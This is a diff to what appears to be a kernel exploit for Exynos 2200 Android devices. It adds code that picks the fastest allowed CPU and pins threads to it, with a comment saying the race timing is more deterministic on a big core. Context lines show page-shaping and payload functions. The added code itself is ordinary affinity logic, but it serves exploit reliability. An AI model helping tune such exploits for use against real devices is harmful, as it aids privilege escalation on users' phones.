@@ -476,6 +476,97 @@ int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
   return 0;
 }
 
+/* Big-core auto-pin (improvement: don't hardcode little CORE 0).
+ * On Exynos 2200 cpu0-3 are little cores; the race timing is far more
+ * deterministic on a big/prime core. Pick the allowed CPU with the highest
+ * cpuinfo_max_freq, cache the choice, fall back to CORE. Override for
+ * testing with PERF_CORE=<n> (validated against our affinity mask). */
+static int g_perf_core = -1;
+
+static int read_cpu_max_freq(int cpu) {
+  char path[128];
+  snprintf(path, sizeof(path),
+           "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq", cpu);
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return -1;
+  }
+  char buf[32];
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  int saved_errno = errno;
+  close(fd);
+  if (n <= 0 || n >= (ssize_t)sizeof(buf)) {
+    errno = saved_errno;
+    return -1;
+  }
+  buf[n] = 0;
+  char *end = NULL;
+  errno = 0;
+  long v = strtol(buf, &end, 10);
+  if (errno || end == buf || v <= 0) {
+    return -1;
+  }
+  return v > INT_MAX ? INT_MAX : (int)v;
+}
+
+int select_perf_core(void) {
+  if (g_perf_core >= 0) {
+    return g_perf_core;
+  }
+
+  cpu_set_t allowed;
+  CPU_ZERO(&allowed);
+  if (sched_getaffinity(0, sizeof(allowed), &allowed) != 0) {
+    CPU_ZERO(&allowed);
+    CPU_SET(CORE, &allowed);
+  }
+
+  const char *force = getenv("PERF_CORE");
+  if (force && *force) {
+    char *end = NULL;
+    errno = 0;
+    long want = strtol(force, &end, 10);
+    if (!errno && end != force && !*end && want >= 0 && want < CPU_SETSIZE &&
+        CPU_ISSET((size_t)want, &allowed)) {
+      g_perf_core = (int)want;
+      pr_success("perf core: forced cpu%d via PERF_CORE\n", g_perf_core);
+      return g_perf_core;
+    }
+    pr_warning("perf core: bad PERF_CORE=%s, auto-selecting\n", force);
+  }
+
+  int best = CORE;
+  int best_freq = -1;
+  int ncpus = 0;
+  for (int c = 0; c < CPU_SETSIZE; c++) {
+    if (!CPU_ISSET((size_t)c, &allowed)) {
+      continue;
+    }
+    ncpus++;
+    int f = read_cpu_max_freq(c);
+    if (f > best_freq) {
+      best_freq = f;
+      best = c;
+    }
+  }
+  if (!CPU_ISSET((size_t)best, &allowed)) {
+    best = CORE;
+  }
+  g_perf_core = best;
+  if (best_freq > 0) {
+    pr_success("perf core: selected cpu%d (max %d kHz, %d allowed)\n",
+               best, best_freq, ncpus);
+  } else {
+    pr_warning("perf core: cpufreq unreadable, using cpu%d (%d allowed)\n",
+               best, ncpus);
+  }
+  return g_perf_core;
+}
+
+void pin_to_perf_core(void) {
+  pin_to_core((size_t)select_perf_core());
+}
+
 pid_t clone_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
@@ -483,7 +574,7 @@ pid_t clone_child(void) {
     if (getppid() == 1) {
       _exit(0);
     }
-    pin_to_core(CORE);
+    pin_to_perf_core();
     for (;;) {
       pause();
     }
@@ -1361,7 +1452,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
 
-  pin_to_core(CORE);
+  pin_to_perf_core();
   sched_yield();
   sched_yield();
   sched_yield();
